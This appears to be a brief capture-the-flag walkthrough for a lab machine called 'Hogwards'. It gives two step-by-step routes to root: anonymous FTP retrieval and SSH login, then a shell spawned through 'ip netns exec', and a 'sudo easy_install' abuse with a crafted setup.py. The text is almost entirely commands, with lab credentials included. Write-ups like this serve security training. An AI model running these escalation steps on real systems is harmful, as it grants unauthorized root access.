# Hogwards
## Method 1
1. `ftp $IP -p 7259` and anonymous
2. `get .I_saved_it_harry.zip`
3. `unzip .I_saved_it_harry.zip` passwod is:`qwer1234`
4. `ssh -l neville -p 9075 $IP`
5. `ip netns add foo`
6. `ip netns exec foo /bin/sh -p`
## Method 2
1. `ssh draco@hogwards.thm` password: `slytherin`
2. `TF=$(mktemp -d)`
3. `echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py`
4. `sudo easy_install $TF`
